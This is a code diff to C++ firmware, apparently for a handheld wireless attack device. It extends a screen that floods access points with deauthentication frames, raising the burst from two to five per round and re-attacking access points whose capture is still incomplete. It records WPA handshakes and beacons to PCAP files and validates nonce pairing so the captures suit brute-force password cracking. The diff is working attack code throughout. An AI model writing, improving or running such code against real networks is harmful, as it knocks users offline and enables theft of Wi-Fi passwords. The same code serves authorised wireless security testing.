@@ -40,6 +40,13 @@ std::unordered_map<
   WifiEapolCaptureScreen::MacEqual
 > WifiEapolCaptureScreen::_pending = {};
 
+std::unordered_map<
+  WifiEapolCaptureScreen::MacAddr,
+  std::vector<uint8_t>,
+  WifiEapolCaptureScreen::MacHash,
+  WifiEapolCaptureScreen::MacEqual
+> WifiEapolCaptureScreen::_beaconStore = {};
+
 // ── PCAP structs ──────────────────────────────────────────────────────────
 
 #pragma pack(push, 1)
@@ -73,6 +80,7 @@ WifiEapolCaptureScreen::~WifiEapolCaptureScreen() {
   _eapolMap.clear();
   _ssidMap.clear();
   _pending.clear();
+  _beaconStore.clear();
   _apCount  = 0;
   _ringHead = 0;
   _ringTail = 0;
@@ -87,6 +95,7 @@ void WifiEapolCaptureScreen::_pushLog(const char* msg, uint16_t color) {
   _log[idx].color = color;
   _logHead = (idx + 1) % LOG_SIZE;
   if (_logCount < LOG_SIZE) _logCount++;
+  Serial.println(msg);
 }
 
 // ── Lifecycle ─────────────────────────────────────────────────────────────
@@ -115,6 +124,7 @@ void WifiEapolCaptureScreen::onInit() {
   _eapolMap.clear();
   _ssidMap.clear();
   _pending.clear();
+  _beaconStore.clear();
 
   _storageOk     = false;
   _lastFreeCheck = 0;
@@ -200,12 +210,34 @@ void WifiEapolCaptureScreen::onUpdate() {
       if (_attackChanIdx == 0) {
         _buildAttackChans();
         if (_attackChanCount == 0) {
+          // Reset incomplete APs: clear deauth count and partial EAPOL data
+          // so they get a fresh attack in the next cycle
+          for (int i = 0; i < _apCount; i++) {
+            MacAddr mac;
+            memcpy(mac.data(), _apTargets[i].bssid, 6);
+            auto it = _eapolMap.find(mac);
+            if (it != _eapolMap.end() && it->second.validated) continue;
+
+            _apTargets[i].deauthCount = 0;
+
+            // Delete partial PCAP and reset entry
+            if (it != _eapolMap.end()) {
+              if (!it->second.filepath.empty()) {
+                Uni.Storage->deleteFile(it->second.filepath.c_str());
+              }
+              _eapolMap.erase(it);
+            }
+            _pending.erase(mac);
+            _beaconStore.erase(mac);
+            _ssidMap.erase(mac);
+          }
+
           _phase          = PHASE_DISCOVERY;
-          _skipBeacons    = false;  // re-enable beacons to discover new APs
+          _skipBeacons    = false;
           _discoveryCount = 0;
           _channel        = 0;
           _chanDwellUntil = now;
-          _pushLog("Done, rescanning...", TFT_WHITE);
+          _pushLog("Rescanning...", TFT_WHITE);
           render();
         }
       }
@@ -291,8 +323,9 @@ void WifiEapolCaptureScreen::_buildAttackChans() {
     MacAddr mac;
     memcpy(mac.data(), _apTargets[i].bssid, 6);
     auto it = _eapolMap.find(mac);
-    if (it != _eapolMap.end() && it->second.hasM1 && it->second.hasM2) continue;
-    if (_apTargets[i].deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;  // exhausted
+    // Only skip if PCAP is confirmed valid: beacon + M1 + M2 all written to file
+    if (it != _eapolMap.end() && it->second.validated) continue;
+    if (_apTargets[i].deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;
 
     uint8_t ch = _apTargets[i].channel;
     bool dup = false;
@@ -344,11 +377,10 @@ void WifiEapolCaptureScreen::_sendDeauth(int ch) {
     MacAddr mac;
     memcpy(mac.data(), _apTargets[i].bssid, 6);
     auto it = _eapolMap.find(mac);
-    if (it != _eapolMap.end() && it->second.hasM1 && it->second.hasM2) continue;
+    if (it != _eapolMap.end() && it->second.validated) continue;
     if (_apTargets[i].deauthCount >= MAX_DEAUTH_ATTEMPTS) continue;
 
-    // Light burst — heavier TX blocks promiscuous RX and loses M2
-    for (int b = 0; b < 2; b++) {
+    for (int b = 0; b < 5; b++) {
       _attacker->deauthenticate(_apTargets[i].bssid, (uint8_t)ch);
     }
     _apTargets[i].deauthCount++;
@@ -430,32 +462,93 @@ void WifiEapolCaptureScreen::_appendPcapFrame(const std::string& path,
 
 // ── EAPOL message type parser ─────────────────────────────────────────────
 
-// Returns: 1=M1 (AP→STA, ACK set, no MIC), 2=M2 (STA→AP, MIC set, no ACK),
-//          3=M3, 4=M4, 0=unknown/other.
-// Key Information (big-endian, 2 bytes at eapol[5..6]):
-//   bit 7 (0x0080): Key ACK  (set on M1, M3)
-//   bit 8 (0x0100): Key MIC  (set on M2, M3, M4)
+// Returns: 1=M1, 2=M2, 3=M3, 4=M4 (zero-nonce M2), 0=unknown.
 static int _parseEapolMsg(const uint8_t* data, uint16_t len) {
   static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
   for (uint16_t i = 24; i + 16 <= len; i++) {
     bool match = true;
     for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
     if (!match) continue;
-    const uint8_t* e = data + i + 8;   // EAPOL header starts here
-    if (len < i + 8 + 7) return 0;
-    if (e[1] != 0x03) return 0;        // not EAPOL-Key
-    if (e[4] != 0x02) return 0;        // not RSN key descriptor
+    const uint8_t* e = data + i + 8;
+    if (len < i + 8 + 49) return 0;     // need up to nonce end
+    if (e[1] != 0x03) return 0;
+    if (e[4] != 0x02) return 0;
     uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
     bool     ack = (ki & 0x0080) != 0;
     bool     mic = (ki & 0x0100) != 0;
     bool     ins = (ki & 0x0040) != 0;
     if  (ack && !mic)        return 1;  // M1
-    if (!ack &&  mic && !ins) return 2;  // M2
     if  (ack &&  mic)        return 3;  // M3
-    if (!ack &&  mic &&  ins) return 4;  // M4
+    if (!ack &&  mic && !ins) {
+      // Distinguish M2 (non-zero nonce) from M4 (zero nonce)
+      bool nonceZero = true;
+      for (int z = 0; z < 32; z++) { if (e[17 + z] != 0) { nonceZero = false; break; } }
+      return nonceZero ? 4 : 2;
+    }
     return 0;
   }
   return 0;
+}
+
+// ── Handshake validation (in-memory pairing, same logic as brute force) ──
+
+int WifiEapolCaptureScreen::_updateValidation(EapolEntry& entry,
+                                                const uint8_t* data, uint16_t len) {
+  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+  if (len < 40) return 0;
+
+  // Find SNAP header
+  int snapOff = -1;
+  for (uint16_t i = 24; i + 16 <= len; i++) {
+    bool match = true;
+    for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
+    if (match) { snapOff = i; break; }
+  }
+  if (snapOff < 0) return 0;
+
+  const uint8_t* e = data + snapOff + 8;
+  if (len < (uint16_t)(snapOff + 8 + 49)) return 0;
+  if (e[1] != 0x03 || e[4] != 0x02) return 0;
+
+  uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
+  bool     ack = (ki & 0x0080) != 0;
+  bool     mic = (ki & 0x0100) != 0;
+  bool     ins = (ki & 0x0040) != 0;
+
+  int msg = 0;
+  if (ack && !mic)       msg = 1;
+  else if (ack && mic)   msg = 3;
+  else if (!ack && mic && !ins) {
+    bool nonceZero = true;
+    for (int z = 0; z < 32; z++) { if (e[17 + z] != 0) { nonceZero = false; break; } }
+    msg = nonceZero ? 4 : 2;
+  }
+  if (msg == 0 || msg == 4) return msg;
+  if (entry.validated) return msg;  // already confirmed — don't overwrite
+
+  if (msg == 1 || msg == 3) {
+    // M1/M3: store ANonce + STA MAC (addr1 = DA = STA in AP→STA direction)
+    memcpy(entry.anonce, e + 17, 32);
+    memcpy(entry.staMacM1, data + 4, 6);
+    entry.hasAnonce = true;
+    // Reverse pair: check if buffered M2 from same STA
+    if (entry.hasM2Data && entry.beaconWritten &&
+        memcmp(entry.staMacM1, entry.staMacM2, 6) == 0) {
+      entry.validated = true;
+    }
+  } else if (msg == 2) {
+    // M2: store SNonce + STA MAC (addr2 = SA = STA in STA→AP direction)
+    memcpy(entry.m2Snonce, e + 17, 32);
+    memcpy(entry.staMacM2, data + 10, 6);
+    entry.hasM2Data = true;
+    // Forward pair: check if have M1/M3 from same STA
+    if (entry.hasAnonce && entry.beaconWritten &&
+        memcmp(entry.staMacM1, entry.staMacM2, 6) == 0) {
+      entry.validated = true;
+    }
+  }
+
+  return msg;
 }
 
 // ── Main loop frame processor ─────────────────────────────────────────────
@@ -487,6 +580,14 @@ void WifiEapolCaptureScreen::_flush() {
       // Register this AP for future deauth injections
       _registerApTarget(cap.bssid, cap.channel);
 
+      // Store first beacon frame for later PCAP writing (skip if AP already validated)
+      auto eIt = _eapolMap.find(cap.bssid);
+      if ((eIt == _eapolMap.end() || !eIt->second.validated) &&
+          _beaconStore.find(cap.bssid) == _beaconStore.end()) {
+        _beaconStore.emplace(cap.bssid,
+          std::vector<uint8_t>(cap.data, cap.data + cap.len));
+      }
+
       // Log newly discovered AP
       if (newSsid) {
         auto ssidIt = _ssidMap.find(cap.bssid);
@@ -516,8 +617,18 @@ void WifiEapolCaptureScreen::_flush() {
       }
 
       if (_storageOk && !entry.filepath.empty()) {
+        bool wasValid = entry.validated;
         for (auto& frame : pendIt->second) {
           _appendPcapFrame(entry.filepath, frame.data(), (uint16_t)frame.size());
+          _updateValidation(entry, frame.data(), (uint16_t)frame.size());
+        }
+        if (!wasValid && entry.validated) {
+          _handshakes++;
+          char buf2[44];
+          snprintf(buf2, sizeof(buf2), "Captured! %s", entry.ssid.c_str());
+          _pushLog(buf2, TFT_MAGENTA);
+          _needRefresh = true;
+          _beaconStore.erase(cap.bssid);  // beacon already in PCAP, free memory
         }
       }
       _pending.erase(pendIt);
@@ -525,16 +636,31 @@ void WifiEapolCaptureScreen::_flush() {
     } else {
       // EAPOL frame
       auto& entry  = _eapolMap[cap.bssid];
-      auto  ssidIt = _ssidMap.find(cap.bssid);
 
-      if (ssidIt != _ssidMap.end()) {
+      // Skip processing if this AP already has a validated handshake
+      if (entry.validated) continue;
+
+      auto  ssidIt = _ssidMap.find(cap.bssid);
+      int msg = _parseEapolMsg(cap.data, cap.len);
+      bool hasSsid = (ssidIt != _ssidMap.end());
+
+      bool wasValid = false;  // entry.validated is false here (checked above)
+      bool written = false;
+      if (hasSsid) {
         if (entry.ssid.empty()) entry.ssid = ssidIt->second;
         if (_storageOk && entry.filepath.empty()) {
           entry.filepath = _makePath(cap.bssid, entry.ssid);
           _writePcapHeader(entry.filepath);
+          auto bcnIt = _beaconStore.find(cap.bssid);
+          if (bcnIt != _beaconStore.end()) {
+            _appendPcapFrame(entry.filepath, bcnIt->second.data(), (uint16_t)bcnIt->second.size());
+            entry.beaconWritten = true;
+            _beaconStore.erase(bcnIt);
+          }
         }
         if (_storageOk && !entry.filepath.empty()) {
           _appendPcapFrame(entry.filepath, cap.data, cap.len);
+          written = true;
         }
       } else {
         auto& pend = _pending[cap.bssid];
@@ -543,20 +669,15 @@ void WifiEapolCaptureScreen::_flush() {
         }
       }
 
+      // Validate handshake pairing (extract nonces + MACs, try M1+M2 pairing)
+      if (written) {
+        _updateValidation(entry, cap.data, cap.len);
+      }
+
       entry.count++;
       _totalEapol++;
 
-      // Parse EAPOL message type to track handshake completeness
-      const bool alreadyComplete = entry.hasM1 && entry.hasM2;
-
-      int msg = _parseEapolMsg(cap.data, cap.len);
-      if (msg == 1) entry.hasM1 = true;
-      if (msg == 2 || msg == 4) entry.hasM2 = true;  // M2 or M4 both have MIC
-      if (msg == 3) entry.hasM1 = true;               // M3 also carries ANonce
-
-      const bool wasComplete = !alreadyComplete && entry.hasM1 && entry.hasM2;
-
-      // Determine display name for this AP (SSID or MAC)
+      // Determine display name
       const char* apName = nullptr;
       char macBuf[18];
       if (ssidIt != _ssidMap.end() && !ssidIt->second.empty()) {
@@ -578,10 +699,14 @@ void WifiEapolCaptureScreen::_flush() {
       uint16_t logColor = (msg == 2 || msg == 4) ? TFT_GREEN : TFT_YELLOW;
       _pushLog(buf, logColor);
 
-      if (wasComplete) {
+      // Count handshake when validation first confirms a valid pair
+      if (entry.validated && !wasValid) {
         _handshakes++;
-        snprintf(buf, sizeof(buf), "Handshake! %s", apName);
+        snprintf(buf, sizeof(buf), "Captured! %s", apName);
         _pushLog(buf, TFT_MAGENTA);
+        // Free memory — beacon and pending no longer needed
+        _beaconStore.erase(cap.bssid);
+        _pending.erase(cap.bssid);
       }
 
       _needRefresh = true;
